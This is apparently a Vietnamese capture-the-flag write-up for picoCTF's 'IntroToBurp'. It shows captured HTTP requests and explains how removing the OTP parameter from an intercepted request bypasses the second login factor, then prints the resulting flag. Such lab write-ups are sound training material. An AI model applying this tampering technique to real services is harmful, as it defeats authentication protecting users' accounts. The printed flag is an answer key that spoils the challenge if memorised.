## Challenge: IntroToBurp
### Information
<img src="https://github.com/user-attachments/files/23537741/0.md" width="500">

### Hints
1. Try using burpsuite to intercept request to capture the flag.
2. Try mangling the request, maybe their server-side code doesn't handle malformed requests very well.
### Solution
Vào Burp Suite -> Open Browser -> Dán link từ đề bài -> Nhập thông tin bất kì.  
<img src="https://github.com/user-attachments/files/23537746/2.md" width="700">
  
Bật **Intercept** và bấm **Register**, Burp Suite bắt được `HTTP POST`
```http
POST / HTTP/1.1
Host: titan.picoctf.net:60673
Content-Length: 201
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://titan.picoctf.net:60673
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titan.picoctf.net:60673/
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJwtzN0OgjAMBeB32bUX-2EWfJllLR0aYSMbxBjju1uITW_6Ned8FD22t7opPEddFLWawlaenEUtgiVAj-hN8gTaMUZ2FmMHwJqJhpFM0pJL-zyHHBeWWBvjsaJlW48aDdAbOdfY2qvUUcxY1_mD7iVzyPuCXIX16VfoB_ntjeu_cspTVt8ffP80_Q.aRaCmg.hLEXLIWIFXBOklAe-mvk-Cwb3-Y
Connection: keep-alive

csrf_token=IjJiNzJjN2I1YmI1MWY1YzcwM2ViYWUzMmJhNDc3ZTBlY2M5ZGMxZjAi.aRaC1w.rhO_9f3rAHf8Pra3ZcyNPbnBlpA&full_name=sdasdas&username=gngn&phone_number=0123456789&city=bbbbbb&password=12345&submit=Register
```
Không có gì cần lưu ý, nhấn **Forward** để tiếp tục  
  
<img src="https://github.com/user-attachments/files/23537754/3.md" width="700">

Ở đây ta nhập một OTP bất kì, Burp Suite bắt được `POST /dashboard`  
```http
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:60673
Content-Length: 8
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://titan.picoctf.net:60673
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titan.picoctf.net:60673/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJwtzN0OwiAMBeB34doLfoZsvgyhXZnGDRYYMcb47pbFpjf9mnM-Ah_HW9wEnCMuAmuJ_shPSqwanEYHFsCqaNFJQxDIaAiDcyQJcZpRRcm52NbVp7ARx-oc-rLmY-812qhh5HMPtb5ymdmUNoPtdM-JfGobUGGWp1_dOPGvVSr_yiUtSXx_e5c0-A.aRaDvg.nhPP75ONqIYGzJlJVxY1Pl5LWSs
Connection: keep-alive

otp=aaaa
```
  
Dựa vào **hint số 2**, ta sẽ xoá dòng `otp=aaaa`, nhấn **Forward** và nhận được flag 
```txt
Welcome, sdfsdf you sucessfully bypassed the OTP request. Your Flag: picoCTF{#0TP_Bypvss_SuCc3$S_6bffad21}
```
